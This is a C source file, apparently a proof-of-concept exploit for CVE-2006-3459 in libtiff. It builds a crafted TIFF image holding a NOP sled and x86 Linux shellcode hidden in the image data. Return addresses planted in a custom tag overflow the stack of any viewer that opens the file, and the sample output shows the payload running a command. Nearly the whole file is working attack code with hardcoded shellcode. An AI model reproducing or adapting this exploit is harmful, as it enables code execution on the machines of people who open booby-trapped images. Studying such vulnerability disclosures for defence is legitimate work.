#include <stdio.h>
#include <string.h>
#include <tiffio.h>
#include <stdlib.h>
#include <stdbool.h>

/*
 * basic exploit for CVE-2006-3459.
 *
 * $ ./a.out 
 * [*] creating exploit.tif, target address: 0xb7959000
 * [*] marker tag found at offset 524418.
 * [*] success.
 * $ display exploit.tif 
 * uid=1000(taviso) gid=100(users) groups=10(wheel)
 *
 * -- taviso@gentoo.org
 */

/* size of nop sled */
#define SLEDSIZ (2048 << 8)

/* get this address by printing tif->tif_base in a debugger */
#define RETADDR (0xb7919000 + SLEDSIZ/2)

#define MARKER 0xc0de /* this must be unique, make it anything */

unsigned char shellcode[] =
"\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68\x2f\x73\x68\x00"
"\x68\x2f\x62\x69\x6e\x89\xe3\x52\xe8\x0c\x00\x00\x00\x2f\x75\x73"
"\x72\x2f\x62\x69\x6e\x2f\x69\x64\x00\x57\x53\x89\xe1\xcd\x80";

TIFFFieldInfo badfield = {
    MARKER,         /* a unique unsigned short we search for */
    100,            /* number of shorts to read onto stack */
    100,            /* number we want to write into file */
    TIFF_SHORT,     /* data type */
    FIELD_CUSTOM,   /* field bit */
    1,              /* okay to change? */
    0,              /* passcount */
    "Exploit"       /* a name, unused */
};

int main(int argc, char **argv)
{
    TIFF *tif;
    FILE *mod;
    unsigned char *buf;
    unsigned short d;
    unsigned f[badfield.field_readcount], i;

    fprintf(stderr, "[*] creating exploit.tif, target address: %p\n", RETADDR);

    /* prepare a buffer containing address of shellcode */
    for (i = 0; i < badfield.field_readcount; i++)
        f[i] = RETADDR;

    /* open the target exploit file */
    if ((tif = TIFFOpen("exploit.tif", "w")) == NULL) {
        fprintf(stderr, "[!] failed to open target.\n");
        return 1;
    }

    /* teach libtiff about made up tag */
    TIFFMergeFieldInfo(tif, &badfield, 1);

    /* install basic required tags */
    TIFFSetField(tif, TIFFTAG_IMAGEWIDTH, SLEDSIZ + sizeof(shellcode));
    TIFFSetField(tif, TIFFTAG_IMAGELENGTH, 1);
    TIFFSetField(tif, TIFFTAG_COMPRESSION, COMPRESSION_NONE);
    TIFFSetField(tif, TIFFTAG_PHOTOMETRIC, PHOTOMETRIC_MINISBLACK);
    
    /* now send buffer containing return addresses */
    TIFFSetField(tif, MARKER, &f);

    if ((buf = malloc(SLEDSIZ + sizeof(shellcode))) == NULL) {
        fprintf(stderr, "[!] sorry, memory allocation error.\n");
    }
    
    memset(buf, 0x90, SLEDSIZ);
    memcpy(buf + SLEDSIZ, shellcode, sizeof(shellcode));

    /* disguise nop sled and shellcode as image data */
    TIFFWriteEncodedStrip(tif, 0, buf, SLEDSIZ + sizeof(shellcode));
    TIFFClose(tif);

    /* okay, now open the file to find the marker taag */
    if ((mod = fopen("exploit.tif", "r+")) == NULL) {
        fprintf(stderr, "[!] failed to open target.\n");
        return 1;
    }

    /* try to find the MARKER by continually reading shorts. */

    /* yes, this is ugly. */
    while (true) {
        if (fread(&d, sizeof(short), 1, mod) < 1) {
            fprintf(stderr, "[!] failed to find marker.\n");
            return 1;
        }
        if (d == MARKER) {
            fprintf(stderr, "[*] marker tag found at offset %d.\n", 
                    ftell(mod) - sizeof(short));

            /* rewind ready to overwrite it */
            if (fseek(mod, - sizeof(short), SEEK_CUR) == -1) {
                fprintf(stderr, "[!] failed to reposition file.\n");
                return 1;
            }

            /* i'll use dot range */
            d = TIFFTAG_DOTRANGE;

            /* write it in */
            if (fwrite(&d, sizeof(short), 1, mod) < 1) {
                fprintf(stderr, "[!] failed to write new tag number.\n");
            }

            break;
        } else {
            if (fseek(mod, - sizeof(short) + 1, SEEK_CUR) == -1) {
                fprintf(stderr, "[!] failed to reposition file.\n");
                return 1;
            }
        }
    }

    fclose(mod);

    fprintf(stderr, "[*] success.\n");
    return 0;
}

